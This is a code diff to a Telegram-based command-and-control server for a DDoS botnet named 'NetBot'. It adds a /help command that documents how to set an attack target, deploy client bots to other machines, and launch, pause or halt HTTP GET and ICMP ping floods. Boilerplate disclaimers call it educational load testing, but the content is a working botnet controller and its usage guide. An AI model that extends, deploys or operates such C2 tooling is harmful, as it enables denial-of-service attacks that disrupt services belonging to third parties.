@@ -58,8 +58,9 @@ Available Commands:
 /update - Update client code
 /config - Show current attack configuration
 /bots - List connected bots
+/help - Show detailed help guide
 
-Use /help for more details.
+Use /help for detailed instructions on how to use this bot.
 """
     update.message.reply_text(welcome_text, parse_mode='Markdown')
 
@@ -159,6 +160,96 @@ def list_bots(update: Update, context: CallbackContext):
             bots_text += f"🔹 Bot {bot_id}\n   IP: {info['ip']}\n   Last Seen: {last_seen}\n\n"
         update.message.reply_text(bots_text, parse_mode='Markdown')
 
+def help_command(update: Update, context: CallbackContext):
+    """Handle /help command"""
+    if not is_authorized(update.effective_user.id):
+        update.message.reply_text("⛔ You are not authorized to use this bot.")
+        return
+    
+    help_text = """
+📚 *NetBot Help Guide* 📚
+
+🤖 *Overview*
+NetBot is a command & control center for DDoS botnet simulation and load generation. This tool is for educational, research, and authorized testing purposes only.
+
+⚠️ *Important Legal Notice*
+- Only use this tool on systems you own or have explicit permission to test
+- Unauthorized use against third-party systems is illegal
+- You are solely responsible for any damage caused by misuse
+
+🔧 *Setup Instructions*
+
+1. **Configure Attack Settings**:
+   - Edit `netbot_config.py` on the server
+   - Set `ATTACK_TARGET_HOST` to your test target IP
+   - Set `ATTACK_TARGET_PORT` to the target port
+   - Choose attack type: `HTTPFLOOD` or `PINGFLOOD`
+   - Set `ATTACK_BURST_SECONDS` for delay between requests (0 = no delay)
+
+2. **Deploy Client Bots**:
+   - Copy `netbot_telegram_client.py` to client machines
+   - Configure the same bot token in `telegram_config.py`
+   - Run clients: `python3 netbot_telegram_client.py`
+
+🎮 *Command Reference*
+
+/start - Show welcome message and available commands
+/status - Display current bot connection status and attack state
+/launch - Start the configured attack
+/halt - Stop all attacks immediately
+/hold - Pause and wait for further commands
+/update - Send update command to connected clients
+/config - Show current attack configuration
+/bots - List all connected bots with their details
+/help - Show this help guide
+
+📊 *Attack Types*
+
+• HTTPFLOOD
+  - Sends HTTP GET requests to target
+  - Requires: Target IP, Port, and Burst Delay
+  - Use for testing web server load capacity
+
+• PINGFLOOD
+  - Sends ICMP echo requests (ping)
+  - Requires: Target IP only
+  - Use for testing network infrastructure
+
+⚙️ *Configuration Parameters*
+
+- `ATTACK_TARGET_HOST`: IP address of test target
+- `ATTACK_TARGET_PORT`: Port number for HTTPFLOOD
+- `ATTACK_TYPE`: "HTTPFLOOD" or "PINGFLOOD"
+- `ATTACK_BURST_SECONDS`: Delay between requests (0 = continuous)
+- `ATTACK_CODE`: Current command state (LAUNCH/HALT/HOLD/UPDATE)
+
+🔄 *Workflow Example*
+
+1. Configure target in `netbot_config.py`
+2. Deploy client bots on test machines
+3. Start server: `python3 netbot_telegram_server.py`
+4. Use `/config` to verify settings
+5. Use `/bots` to check connected clients
+6. Use `/launch` to start test
+7. Use `/halt` to stop immediately
+8. Use `/status` to monitor progress
+
+🛡️ *Safety Guidelines*
+
+- Always test in isolated environments
+- Monitor system resources during tests
+- Have emergency stop procedures ready
+- Keep detailed logs of all test activities
+- Never test on production systems without authorization
+
+📞 *Support*
+For issues or questions, refer to the GitHub repository or documentation.
+
+⚠️ *Disclaimer*
+This software is provided for educational and research purposes only. The authors are not responsible for any misuse or damage caused by this tool.
+"""
+    update.message.reply_text(help_text, parse_mode='Markdown')
+
 def register_bot(bot_id, ip_address):
     """Register a bot connection"""
     global connected_bots
@@ -197,6 +288,7 @@ def main():
     dispatcher.add_handler(CommandHandler("update", update_client))
     dispatcher.add_handler(CommandHandler("config", show_config))
     dispatcher.add_handler(CommandHandler("bots", list_bots))
+    dispatcher.add_handler(CommandHandler("help", help_command))
     
     # Handle heartbeat messages from bots
     dispatcher.add_handler(MessageHandler(Filters.text & ~Filters.command, heartbeat_handler))
